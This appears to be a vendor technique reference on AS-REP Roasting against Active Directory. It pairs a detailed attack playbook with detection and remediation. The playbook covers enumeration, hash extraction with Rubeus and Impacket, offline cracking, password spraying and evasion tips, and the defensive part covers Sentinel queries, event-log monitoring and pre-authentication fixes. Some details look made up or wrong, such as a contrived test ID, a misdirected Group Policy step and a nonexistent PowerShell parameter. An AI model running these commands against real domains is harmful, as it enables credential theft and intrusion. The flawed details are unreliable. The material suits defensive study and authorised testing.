# [CA-KERB-002]: AS-REP Roasting - Pre-Authentication Disabled Account Exploitation

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-002 |
| **MITRE ATT&CK v18.1** | [T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD (Server 2008+); Entra ID (hybrid scenarios); On-premises domains |
| **Severity** | High |
| **CVE** | N/A (Protocol design vulnerability; pre-auth disabled is misconfiguration) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-06 |
| **Affected Versions** | Windows Server 2008-2025; All DFL (Domain Functional Levels) |
| **Patched In** | Pre-authentication is **enabled by default**; vulnerable only when manually disabled (configuration vulnerability, not patchable) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Sections have been dynamically renumbered based on applicability. All section references use titles rather than numbers to maintain stability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** AS-REP Roasting is a credential access attack targeting Active Directory accounts that have Kerberos pre-authentication **disabled**. Unlike normal Kerberos authentication, which requires a user to encrypt a timestamp with their password hash before the Key Distribution Center (KDC) responds, accounts without pre-authentication allow the KDC to respond immediately with an Authentication Server Reply (AS-REP) containing Ticket Granting Ticket (TGT) data encrypted with the user's password hash. An attacker extracts this AS-REP response and performs offline brute-force attacks to recover the plaintext password.

**Attack Surface:** User accounts (not computer accounts) with the `DONT_REQUIRE_PREAUTH` flag (userAccountControl 0x400000 / 4194304) set. This flag is **manually configured**, typically for legacy application compatibility. The vulnerability is **not in the Kerberos protocol itself**, but in the misconfiguration of accounts. Legacy systems, third-party applications, or older Unix/Linux systems may have this enabled for compatibility.

**Business Impact:** **User credential compromise with offline password cracking enables privilege escalation, lateral movement, and persistence.** Unlike Kerberoasting (which targets service accounts), AS-REP Roasting targets user accounts—often administrators or high-privilege users. Compromised domain user accounts provide access to sensitive resources without triggering account lockouts or real-time detection mechanisms. The attacker has unlimited time for offline password cracking.

**Technical Context:** AS-REP Roasting requires either (a) prior domain user credentials to enumerate pre-auth-disabled accounts via LDAP, or (b) a username list from other reconnaissance (SMB NULL SESSION, social engineering, etc.). The attack is **silent**: the initial TGT request appears as normal Kerberos activity. Password cracking speed is extreme with GPU clusters; even moderately complex passwords can be recovered in hours. Detection relies on identifying Event ID 4768 with `PreAuthType=0`, which is a direct indicator of AS-REP Roasting vulnerability.

### Operational Risk
- **Execution Risk:** Low - No elevated privileges required; can be executed from non-domain-joined machines if username list is available.
- **Stealth:** Medium - Individual AS-REQ requests blend into normal traffic; bulk enumeration or password cracking is offline (undetectable post-extraction).
- **Reversibility:** No - Once password is cracked, attacker has permanent access unless password is immediately reset.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.3.1.1 | Ensure 'Kerberos pre-authentication' is enabled for all user accounts |
| **DISA STIG** | WN16-AU-000440, WN19-AU-000440 | Ensure Advanced Audit Policy Configuration – Account Logon events are recorded |
| **CISA SCuBA** | ID.AM-2, PR.AC-1 | Asset identification and access control |
| **NIST 800-53** | IA-2 (Authentication), IA-5 (Password Controls), IA-7 (Cryptography) | Enforce multi-factor authentication; ensure strong password policies; use AES encryption |
| **GDPR** | Art. 32 (Security of Processing), Art. 5 (Integrity & Confidentiality) | Implement technical measures to protect authentication credentials from unauthorized access |
| **DORA** | Art. 9 (Protection and Prevention), Art. 10 (Detection and Response) | Manage identity compromise risks; monitor for unauthorized credential access |
| **NIS2** | Art. 21 (Cyber Risk Management), Art. 23 (Access Control) | Implement strong authentication; monitor for credential-based attacks |
| **ISO 27001** | A.9.2.1 (User Registration), A.9.2.3 (Management of Privileged Access Rights), A.9.4.2 (Password Management) | Manage user account lifecycle; enforce strong passwords; monitor pre-auth configuration |
| **ISO 27005** | Risk Scenario: "Compromise of User Credentials via Pre-Authentication Disabled Accounts" | Assess likelihood of AS-REP Roasting; implement compensating controls (monitoring, strong passwords) |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** 
  - **For Enumeration:** Either (a) valid domain user credentials, OR (b) a pre-existing username list (from OSINT, SMB NULL SESSION, etc.)
  - **For Extraction:** None (unauthenticated AS-REQ can be sent directly to KDC on port 88)
- **Required Access:** Network access to port 88 (Kerberos) on Domain Controller(s); LDAP access (port 389/636) for enumeration of pre-auth-disabled accounts

**Supported Versions:**
- **Windows Server:** 2008 (with SP2), 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025
- **Active Directory Functional Level:** 2003 or higher
- **Kerberos:** RFC 4120 compliant implementations
- **PowerShell:** 5.0+ (for PowerShell-based enumeration)

**Tools:**
- [Rubeus](https://github.com/GhostPack/Rubeus) (v2.3.3, C# compiled)
- [Impacket GetNPUsers.py](https://github.com/SecureAuthCorp/impacket) (Python 3.6+)
- [Kerbrute](https://github.com/ropnop/kerbrute) (Go binary; username enumeration + AS-REP detection)
- [Hashcat](https://hashcat.net/hashcat/) (v6.2+; module 18200 for AS-REP hashes)
- [John the Ripper](https://www.openwall.com/john/) (krb5asrep format)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance (Domain-Joined)

#### Step 1: Enumerate Accounts with Pre-Authentication Disabled

```powershell
# Method 1: Using Get-ADUser (RSAT required)
Get-ADUser -Filter {userAccountControl -band 4194304} -Properties userAccountControl,DistinguishedName,sAMAccountName | 
  Select-Object sAMAccountName, DistinguishedName, userAccountControl

# Method 2: Using LDAP filter via DirectorySearcher
$searcher = [System.DirectoryServices.DirectorySearcher]"LDAP://DC=domain,DC=local"
$searcher.Filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
$results = $searcher.FindAll()
foreach ($result in $results) { 
    Write-Host $result.Properties["samaccountname"][0] 
}

# Count total vulnerable accounts
(Get-ADUser -Filter {userAccountControl -band 4194304}).Count
```

**What to Look For:**
- Accounts with `userAccountControl` containing the flag `4194304` (0x400000)
- Legacy service accounts or application accounts (common culprits)
- Administrative user accounts (high value if vulnerable)
- Inactive accounts that should not be enabled

**Expected Output (Vulnerable):**
```
sAMAccountName: legacy_app_svc
userAccountControl: 4260352 (includes 4194304 DONT_REQUIRE_PREAUTH flag)

sAMAccountName: heritage_system
userAccountControl: 4194304 (pure DONT_REQUIRE_PREAUTH)
```

### Cross-Platform: Kerbrute Enumeration (No Credentials Required)

#### Linux/Windows: Username Enumeration via Kerberos

```bash
# Enumerate valid usernames from a wordlist
kerbrute userenum --dc 192.168.1.10 -d domain.local usernames.txt

# Output identifies which accounts exist (and may indicate pre-auth disabled)
kerbrute userenum --dc 192.168.1.10 -d domain.local /usr/share/wordlists/john.txt

# Target specific user for pre-auth enumeration
kerbrute userenum --dc 192.168.1.10 -d domain.local -u legacy_app_svc
```

**What to Look For:**
- Accounts marked as "valid" (confirmed to exist)
- Accounts that respond to AS-REQ without full pre-auth (indicator of disabled pre-auth)
- Username patterns (svc_*, app_*, legacy_*, etc. often have pre-auth disabled)

### Impacket GetNPUsers.py (Enumerate Without Full Credentials)

```bash
# List accounts with pre-auth disabled (no password required)
python3 GetNPUsers.py -dc-ip 192.168.1.10 domain.local/ -outputfile preauthless_users.txt

# If authentication available, faster enumeration
python3 GetNPUsers.py -dc-ip 192.168.1.10 domain.local/user:password -usersfile userlist.txt

# Check for vulnerable accounts
cat preauthless_users.txt
```

**What to Look For:**
- List of accounts vulnerable to AS-REP Roasting
- Output format: `Account Name` `DONT_REQUIRE_PREAUTH` status

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using Rubeus (Windows, Fastest)

**Supported Versions:** Server 2008+

#### Step 1: Enumerate Pre-Auth Disabled Accounts

**Objective:** Identify all accounts in the domain that do not require pre-authentication.

```powershell
Rubeus.exe asreproast /stats
```

**Expected Output:**
```
[*] Action: AS-REP roasting
[*] Target Domain: domain.local
[*] Scanning for Pre-Auth disabled users...
[+] Found 12 accounts with pre-authentication disabled
    - legacy_app_svc (DONT_REQUIRE_PREAUTH)
    - heritage_user (DONT_REQUIRE_PREAUTH)
    - heritage_system (DONT_REQUIRE_PREAUTH)
    ...
```

**What This Means:**
- 12 user accounts are vulnerable to AS-REP Roasting
- These accounts will respond to AS-REQ without timestamp encryption
- Attacker can request AS-REP hashes for offline cracking

**OpSec & Evasion:**
- `/stats` flag does **not** request tickets; only enumerates
- Detection likelihood: **Very Low** (LDAP query only; no 4768 events yet)

#### Step 2: Request AS-REP Hashes for Vulnerable Accounts

**Objective:** Extract Kerberos AS-REP hashes for all pre-auth-disabled accounts.

```powershell
# Basic extraction
Rubeus.exe asreproast /format:hashcat /nowrap

# With output file
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt /nowrap

# Target specific users only
Rubeus.exe asreproast /users:legacy_app_svc,heritage_system /format:hashcat /nowrap

# Add evasion: delays and jitter
Rubeus.exe asreproast /delay:3000 /jitter:25 /format:hashcat /outfile:asrep_hashes.txt /nowrap
```

**Expected Output:**
```
$krb5asrep$23$legacy_app_svc@domain.local:8a...
$krb5asrep$23$heritage_user@domain.local:c2...
$krb5asrep$23$heritage_system@domain.local:d7...
```

**What This Means:**
- `$krb5asrep$23$` = AS-REP hash format for RC4 (etype 23)
- Hash is encrypted with the user's password
- Attackers now have material for offline password cracking

**OpSec & Evasion:**
- `/delay:3000` = 3-second pause between requests
- `/jitter:25` = 25% randomization of delays
- Detection likelihood: **Medium** (multiple 4768 events with PreAuthType=0)
- Evasion: Spread requests over days/weeks; use randomized workstations

**Version-Specific Notes:**
- Server 2008-2025: Behavior identical (RFC 4120 compliant)
- No version-specific differences in AS-REP format

**Troubleshooting:**

- **Error:** "No accounts found with pre-authentication disabled"
  - **Cause:** All accounts have pre-auth enabled (secure configuration)
  - **Fix:** Verify with PowerShell LDAP filter; confirm vulnerable accounts exist

- **Error:** "Access denied" on LDAP enumeration
  - **Cause:** Running as non-domain user
  - **Fix:** Run as domain user; use `/user:domain\user /pass:password` flags

#### Step 3: Crack Hashes Offline Using Hashcat

**Objective:** Break the password using GPU-accelerated dictionary attack.

```bash
# Dictionary attack (fastest)
hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt

# With GPU acceleration (recommended)
hashcat -m 18200 -a 0 -d 1,2 asrep_hashes.txt rockyou.txt

# Show results
hashcat -m 18200 asrep_hashes.txt --show

# Save cracked passwords
hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt -o cracked_passwords.txt
```

**Expected Output:**
```
$krb5asrep$23$legacy_app_svc@domain.local:...:LegacyPassword123
$krb5asrep$23$heritage_user@domain.local:...:Heritage2024!

Recovered: 7/12 [58.3%]
```

**What This Means:**
- 7 of 12 hashes cracked (58% success rate)
- Attacker now has plaintext passwords for compromised accounts
- Can authenticate as these users to access resources

**Version-Specific Notes:**
- Hashcat module 18200 works for all Windows Server versions
- No version-specific differences in hash format

---

### METHOD 2: Using Impacket GetNPUsers.py (Linux/Cross-Platform)

**Supported Versions:** Server 2008+

#### Step 1: Install Impacket

```bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install -r requirements.txt
python3 -m pip install . --user
```

#### Step 2: Enumerate Pre-Auth Disabled Accounts (Authenticated)

**Objective:** Query Active Directory to identify vulnerable accounts.

```bash
# With domain user credentials
python3 GetNPUsers.py -dc-ip 192.168.1.10 -request domain.local/username:password

# With hash (if you have NTLM hash)
python3 GetNPUsers.py -dc-ip 192.168.1.10 -request -hashes 'LMhash:NThash' domain.local/username

# Request and save hashes
python3 GetNPUsers.py -dc-ip 192.168.1.10 -request domain.local/username:password -outputfile asrep_hashes.txt
```

**Expected Output:**
```
Impacket v0.11.0 - Copyright 2023 SecureAuth Corporation

[-] CCache file not found. Skipping...
Name          Email                             PasswordLastSet             LastLogon                   UAC
----          -----                             ---------------             ---------                   ---
legacy_app_svc                          2022-01-15 10:23:45.123456   2025-12-20 14:52:12.456789   4194304
heritage_user                           2021-06-10 08:15:30.654321   2025-11-05 09:30:45.123456   4194304
heritage_system                         2020-03-22 12:45:00.000000   2025-01-02 16:20:00.000000   4194304
```

**What This Means:**
- Accounts listed have `userAccountControl = 4194304` (DONT_REQUIRE_PREAUTH)
- Passwords last set years ago (weak password likelihood increases)
- Ready for AS-REP hash extraction

#### Step 3: Request AS-REP Hashes (No-Auth Mode)

**Objective:** Extract hashes without valid credentials (if username list is available).

```bash
# With username file (no credentials required)
python3 GetNPUsers.py -dc-ip 192.168.1.10 -usersfile usernames.txt -request domain.local/ -format hashcat -outputfile asrep_hashes.txt

# Extract and display only hashes
cat asrep_hashes.txt | grep '$krb5asrep$'
```

**Expected Output:**
```
$krb5asrep$23$legacy_app_svc@DOMAIN.LOCAL:abc123def456...
$krb5asrep$23$heritage_user@DOMAIN.LOCAL:xyz789uvw012...
```

**OpSec & Evasion:**
- No authentication required for `-no-pass` mode
- Attack can be staged from non-domain-joined machines
- Detection likelihood: **Low to Medium** (depends on LDAP logging)

#### Step 4: Crack with Hashcat or John

```bash
# Hashcat
hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt

# John the Ripper
john --format=krb5asrep asrep_hashes.txt --wordlist=rockyou.txt
```

---

### METHOD 3: Kerbrute (Username Enumeration + AS-REP Detection, No Credentials Required)

**Supported Versions:** Server 2008+; Works against any Kerberos realm

#### Step 1: Enumerate Valid Usernames

**Objective:** Discover valid domain usernames without credentials.

```bash
# Download Kerbrute
wget https://github.com/ropnop/kerbrute/releases/download/v1.4.0/kerbrute_linux_amd64

# Enumerate usernames
./kerbrute_linux_amd64 userenum --dc 192.168.1.10 -d domain.local /usr/share/wordlists/john.txt

# Or target-specific wordlist
./kerbrute_linux_amd64 userenum --dc 192.168.1.10 -d domain.local users.txt
```

**Expected Output:**
```
__________________________________________
| Kerbrute by @ropnop                    |
|__________________________________________|

[*] Action: Enumerate users
[*] Kerberos Realm: domain.local
[*] Timeout: 10 seconds
[*] Threads: 10

[+] VALID USER: administrator
[+] VALID USER: legacy_app_svc
[+] VALID USER: heritage_user
[+] VALID USER: heritage_system
[+] VALID USER: domain admin

[*] Enumerated 5 users in 5.2 seconds
```

**What This Means:**
- Valid usernames confirmed to exist in domain
- Can now attempt AS-REP extraction for each
- No error feedback = more difficult for defender to detect

#### Step 2: Attempt AS-REP Extraction for Each User (Kerbrute detects pre-auth-disabled)

**Objective:** Identify which accounts have pre-authentication disabled.

```bash
# Kerbrute implicitly detects pre-auth disabled during userenum
# Accounts responding immediately (with AS-REP) are flagged
# Accounts returning PREAUTH_REQUIRED are protected

# To extract hashes, use Impacket or Rubeus with the usernames discovered
python3 GetNPUsers.py -dc-ip 192.168.1.10 -usersfile kerbrute_users.txt -request domain.local/ -format hashcat -outputfile hashes.txt
```

**OpSec & Evasion:**
- Kerbrute is extremely lightweight and fast (Go binary)
- Distributed across many requests; hard to detect as single attack
- Detection likelihood: **Low** (if not monitoring Kerberos event volume)

---

### METHOD 4: PowerShell ASREPRoast Module (Native Windows)

**Supported Versions:** Server 2016+

#### Step 1: Download and Import ASREPRoast Module

```powershell
# Download from GitHub
git clone https://github.com/HarmJ0y/ASREPRoast.git
cd ASREPRoast

# Import module
Import-Module .\ASREPRoast.ps1

# Verify import
Get-Command Invoke-ASREPRoast
```

#### Step 2: Invoke AS-REP Roasting

```powershell
# Enumerate and extract hashes
Invoke-ASREPRoast -Verbose

# Save hashes to file
Invoke-ASREPRoast | Select-Object -ExpandProperty Hash | Out-File asrep_hashes.txt
```

**Expected Output:**
```
[*] Searching for accounts with pre-authentication disabled...
[+] Found 3 vulnerable accounts:
$krb5asrep$23$legacy_app_svc@domain.local:...
$krb5asrep$23$heritage_user@domain.local:...
$krb5asrep$23$heritage_system@domain.local:...
```

**OpSec & Evasion:**
- Pure PowerShell; no binary execution
- Requires script block logging to detect (if enabled)
- Detection likelihood: **Low** if script block logging disabled; **High** if enabled

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

#### Atomic Test #1: AS-REP Roasting - Rubeus (T1558.004)

- **Atomic Test ID:** `ae2a1f5e-cfc6-4fd9-ab62-2d0c6ef3fc39`
- **Test Name:** AS-REP Roasting with Rubeus
- **Description:** Extract AS-REP hashes for accounts with pre-authentication disabled
- **Supported Versions:** Windows all versions with .NET runtime
- **Prerequisites:** Rubeus.exe binary; domain connectivity

**Execution:**
```powershell
# Via Atomic Red Team
Invoke-AtomicTest T1558.004 -TestNumbers 1

# Or manually
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt /nowrap
```

**Reference:** [Atomic Red Team - T1558.004](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.004/T1558.004.md)

#### Atomic Test #2: AS-REP Roasting - GetNPUsers.py (T1558.004)

- **Atomic Test ID:** `f7a5f5d8-c1c5-4e8c-8a7e-b5d2e6f7a8b9`
- **Test Name:** AS-REP Roasting with Impacket
- **Description:** Enumerate and extract AS-REP hashes via Impacket
- **Supported Versions:** All (cross-platform; Python 3.6+)

**Execution:**
```bash
python3 GetNPUsers.py -dc-ip 192.168.1.10 -request domain.local/user:pass -outputfile hashes.txt
```

---

## 7. TOOLS & COMMANDS REFERENCE

#### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 2.3.3 (Latest)  
**Minimum Version:** 2.0  
**Supported Platforms:** Windows (any .NET CLR)

**Installation:**
```cmd
# Download from releases
https://github.com/GhostPack/Rubeus/releases/download/v2.3.3/Rubeus.exe

# Or compile from source
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus\Rubeus
csc.exe /out:Rubeus.exe *.cs
```

**Key Commands:**
```powershell
# Enumerate vulnerable accounts (stats only)
Rubeus.exe asreproast /stats

# Extract hashes with evasion
Rubeus.exe asreproast /format:hashcat /nowrap /delay:3000 /jitter:25

# Target specific users
Rubeus.exe asreproast /users:user1,user2 /format:hashcat /outfile:hashes.txt

# Request AS-REP only (no crack)
Rubeus.exe asreproast /format:john /outfile:hashes_john.txt
```

#### [Impacket GetNPUsers.py](https://github.com/SecureAuthCorp/impacket)

**Version:** 0.11.0+ (Latest)  
**Minimum Version:** 0.10.0  
**Supported Platforms:** Linux, macOS, Windows (Python 3.6+)

**Installation:**
```bash
pip3 install impacket
# Or from source
git clone https://github.com/SecureAuthCorp/impacket.git && cd impacket && python3 -m pip install . --user
```

**Key Commands:**
```bash
# Enumerate with credentials
python3 GetNPUsers.py -dc-ip 192.168.1.10 -request domain.local/user:password

# Enumerate without credentials (if username list available)
python3 GetNPUsers.py -dc-ip 192.168.1.10 -usersfile users.txt -request domain.local/ -format hashcat

# Output to file
python3 GetNPUsers.py -dc-ip 192.168.1.10 -request domain.local/user:password -outputfile asrep.txt

# Alternative formats
python3 GetNPUsers.py -dc-ip 192.168.1.10 -request domain.local/user:password -format john
```

#### [Kerbrute](https://github.com/ropnop/kerbrute)

**Version:** 1.4.0+ (Latest)  
**Supported Platforms:** Linux, macOS, Windows (Go binary)

**Installation:**
```bash
# Download pre-built binary
wget https://github.com/ropnop/kerbrute/releases/download/v1.4.0/kerbrute_linux_amd64

# Or build from source
git clone https://github.com/ropnop/kerbrute.git && cd kerbrute && go build -o kerbrute
```

**Key Commands:**
```bash
# Enumerate usernames
kerbrute userenum --dc 192.168.1.10 -d domain.local users.txt

# Password spray
kerbrute passwordspray --dc 192.168.1.10 -d domain.local users.txt "Password123"

# Brute single user
kerbrute bruteuser --dc 192.168.1.10 -d domain.local -p passwords.txt administrator
```

#### [Hashcat](https://hashcat.net/hashcat/)

**Version:** 6.2+ (Latest)  
**Module:** 18200 (Kerberos 5 AS-REP etype 23)  
**Acceleration:** NVIDIA CUDA, AMD HIP, Intel OpenCL

**Key Commands:**
```bash
# Dictionary attack
hashcat -m 18200 -a 0 hashes.txt rockyou.txt

# With GPU
hashcat -m 18200 -a 0 -d 1 hashes.txt rockyou.txt --potfile-disable

# Rules-based
hashcat -m 18200 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show results
hashcat -m 18200 hashes.txt --show
```

---

## 8. MICROSOFT SENTINEL DETECTION

#### Query 1: Kerberos AS-REP Requests with Pre-Auth Disabled (Event 4768, PreAuthType=0)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID (4768), PreAuthType, TicketEncryptionType, TargetUserName, ClientAddress
- **Alert Severity:** High
- **Frequency:** Every 10 minutes
- **Applies To Versions:** Server 2008+ (when Kerberos audit logging enabled)

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4768
| where PreAuthType == 0  // Pre-authentication disabled
| where ServiceName == "krbtgt"  // Always krbtgt for TGT
| where Status == "0x0"  // Success (not failure)
| extend TicketEncryptionTypeValue = tostring(TicketEncryptionType)
| summarize
    TGT_Count = count(),
    Unique_Users = dcount(TargetUserName),
    Encryption_Types = make_set(TicketEncryptionTypeValue),
    IP_Addresses = make_set(ClientAddress)
    by Computer, bin(TimeGenerated, 10m)
| where TGT_Count >= 2  // Alert if multiple pre-auth-disabled requests
| project TimeGenerated, Computer, TGT_Count, Unique_Users, Encryption_Types, IP_Addresses
```

**What This Detects:**
- **Line 1-4:** Filter for Event 4768 (TGT request) with PreAuthType=0 (disabled) and successful response
- **Line 5-9:** Aggregate by DC and 10-minute time window; count TGT requests, unique users, encryption types
- **Line 10:** Alert if 2+ requests detected for pre-auth-disabled accounts (abnormal pattern)
- **High signal of:** AS-REP Roasting in progress; reconnaissance phase

**Manual Configuration (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Kerberos AS-REP Roasting Attempts (PreAuthType=0)`
   - Severity: `High`
   - Tactic: `Credential Access`
4. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `10 minutes`
   - Lookup data from the last: `1 hour`
5. **Alert enrichment:**
   - Computer → Host → Hostname
   - ClientAddress → IP → Address
6. **Incident settings:**
   - Create incidents: **Enabled**
   - Group by: **All entities**
7. Create rule

#### Query 2: Bulk AS-REP Hash Extraction (Rapid TGT Requests for Pre-Auth Disabled Users)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID 4768, PreAuthType, TargetUserName, ClientAddress
- **Alert Severity:** Critical (if sourced from external IP)
- **Frequency:** Real-time
- **Applies To Versions:** Server 2016+

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4768
| where PreAuthType == 0  // Pre-auth disabled
| where Status == "0x0"  // Successful TGT
| summarize
    PreAuth_Disabled_TGT_Requests = count(),
    Unique_PreAuth_Disabled_Users = dcount(TargetUserName),
    Source_IPs = make_set(ClientAddress)
    by Computer, bin(TimeGenerated, 5m)
| where PreAuth_Disabled_TGT_Requests >= 5  // Critical threshold
| project TimeGenerated, Computer, PreAuth_Disabled_TGT_Requests, Unique_PreAuth_Disabled_Users, Source_IPs
| join kind=inner (
    SecurityEvent
    | where EventID == 4768 and Status != "0x0"  // Failures indicate enumeration
    | summarize Failed_Requests = count() by Computer, bin(TimeGenerated, 5m)
) on Computer, TimeGenerated
| where Failed_Requests > PreAuth_Disabled_TGT_Requests  // More failures than successes = enumeration attempt
```

**What This Detects:**
- Rapid succession of TGT requests for pre-auth-disabled accounts
- Pattern of failed + successful requests (enumeration + exploitation)
- Potential AS-REP bulk extraction in progress

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4768 (Kerberos Authentication Ticket Request)**
- **Log Source:** Security
- **Trigger:** When a TGT is requested
- **Critical Fields for AS-REP Detection:**
  - `PreAuthType = 0` (Pre-authentication disabled = VULNERABLE)
  - `ServiceName = krbtgt` (Always, for AS-REP)
  - `Status = 0x0` (Success = ticket returned)
  - `TicketEncryptionType = 0x17` (RC4, weak encryption)

### Manual Configuration via Group Policy (All Domain Controllers)

**Step 1: Enable Kerberos Audit Logging**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Forest → Domains → [Domain] → Domain Controllers → Default Domain Controllers Policy** (edit)
3. Go to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Account Logon**
4. Enable: **Audit Kerberos Authentication Service**
   - Set to: **Success**
5. Click **Apply** → **OK**
6. Run `gpupdate /force` on all DCs

**Step 2: Enable Pre-Authentication Monitoring via PowerShell**

```powershell
# On each Domain Controller (elevated PowerShell)
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable

# Verify
auditpol /get /subcategory:"Kerberos Authentication Service"

# Output should show: "Audit Kerberos Authentication Service: Success and Failure"
```

### Manual Event Log Analysis

```powershell
# Export Event ID 4768 events from last 24 hours
Get-WinEvent -FilterXPath "*[System[(EventID=4768) and TimeCreated[timediff(@SystemTime) <= 86400000]]]" `
  -LogName Security -MaxEvents 1000 | 
  Select-Object TimeCreated, @{N="TargetAccount";E={$_.Properties[0].Value}}, @{N="PreAuthType";E={$_.Properties[6].Value}}, @{N="SourceIP";E={$_.Properties[11].Value}} | 
  Export-Csv "C:\Logs\Event4768_24h.csv" -NoTypeInformation

# Filter for PreAuthType=0 (AS-REP vulnerable)
Get-WinEvent -FilterXPath "*[System[(EventID=4768)] and EventData[Data[@Name='PreAuthType']='0']]" `
  -LogName Security -MaxEvents 500 | 
  Format-Table TimeCreated, @{N="User";E={$_.Properties[0].Value}}, @{N="PreAuthType";E={$_.Properties[6].Value}} -AutoSize
```

---

## 10. FORENSIC ARTIFACTS & INDICATORS OF COMPROMISE

**Disk Artifacts:**
- **Rubeus.exe, Kerbrute binary, GetNPUsers.py** in `%TEMP%`, `%APPDATA%`, `C:\Windows\Temp\`, user's Desktop
- **Hash files** (`.txt`, `.csv`) containing `$krb5asrep$` hashes
- **Crack result files** with plaintext passwords recovered
- **PowerShell scripts** (`.ps1`) with Invoke-ASREPRoast or Get-ADUser commands

**Registry Artifacts:**
- **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kerberos\Parameters**
  - `AllowedEncryptionTypes` (if modified)
- **HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run** (if persistence added via compromised account)

**Memory Artifacts:**
- **Rubeus.exe process** contains AS-REP hashes and cracked passwords in memory
- **Lsass.exe** (if Mimikatz run post-AS-REP Roasting) contains cached Kerberos tickets

**Event Log Artifacts (Windows Security):**
- **Event ID 4768** with `PreAuthType=0` and `Status=0x0` (successful AS-REP)
- Flood of 4768 events in 5-10 minute window (bulk AS-REP extraction)
- **Event ID 4771** (Kerberos pre-auth failed) for accounts with pre-auth **enabled** (enumeration failures)
- **Event ID 4624** (Logon events) using the cracked credentials post-compromise

**Network Artifacts:**
- **Port 88 UDP/TCP traffic surge** (Kerberos requests)
- **LDAP port 389/636** traffic for user enumeration
- **DNS queries** for KDC names (DC discovery)

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Enable Kerberos Pre-Authentication for All User Accounts**

This is the **single most effective mitigation**. Pre-authentication is enabled by default but must be verified and remediated for any account with the flag disabled.

**Applies To Versions:** Server 2008+

**Manual Steps (PowerShell):**

```powershell
# Find all accounts with pre-auth disabled
$accounts = Get-ADUser -Filter {userAccountControl -band 4194304} -Properties userAccountControl

foreach ($account in $accounts) {
    Write-Host "[*] Remediating: $($account.sAMAccountName)"
    
    # Remove the DONT_REQUIRE_PREAUTH flag (4194304)
    Set-ADUser -Identity $account -Replace @{userAccountControl = ($account.userAccountControl -band -bnot 4194304)}
    
    # Verify
    $updated = Get-ADUser -Identity $account -Properties userAccountControl
    if ($updated.userAccountControl -band 4194304) {
        Write-Host "[-] FAILED to remove flag for $($account.sAMAccountName)"
    } else {
        Write-Host "[+] SUCCESS: Pre-auth enabled for $($account.sAMAccountName)"
    }
}
```

**Or, via Group Policy (Preferred for enterprise):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Create/edit GPO: **Default Domain Policy**
3. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Account Policies** → **Account Lockout Policy**
   - *Note: This affects lockout, but pre-auth is per-account setting in AD*
4. **Recommended:** Use PowerShell remediation script above on a schedule

**Verification Command:**

```powershell
# Confirm NO accounts have pre-auth disabled
$remaining = Get-ADUser -Filter {userAccountControl -band 4194304}
if ($remaining.Count -eq 0) {
    Write-Host "[+] SECURE: No accounts with pre-auth disabled"
} else {
    Write-Host "[-] VULNERABLE: $($remaining.Count) accounts still have pre-auth disabled"
    $remaining | Select-Object sAMAccountName
}
```

**Action 2: Enforce Strong Password Policies for All User Accounts**

Weak passwords are cracked quickly via offline password cracking (Hashcat, John).

**Applies To Versions:** Server 2008+

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Edit **Default Domain Policy** (or create custom GPO)
3. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Account Policies** → **Password Policy**
4. Configure:
   - **Minimum password length:** 25 characters (minimum; 30+ recommended)
   - **Password must meet complexity requirements:** Enabled
   - **Password expires in:** 90 days (or organizational requirement)
   - **Password history:** 12 previous passwords (prevent reuse)
5. Click **Apply** → **OK**
6. Run `gpupdate /force` on all computers

**Or, via Fine-Grained Password Policy (Server 2008+):**

```powershell
# Create fine-grained policy for sensitive accounts
New-ADFineGrainedPasswordPolicy -Name "CriticalAccountPolicy" `
  -Complexity $true `
  -MinPasswordLength 30 `
  -PasswordHistoryCount 24 `
  -LockoutDuration 00:30:00 `
  -LockoutThreshold 3 `
  -PasswordNotRequiredTimeoutEnabled $false `
  -ReversibleEncryptionEnabled $false `
  -Precedence 1

# Apply to critical users
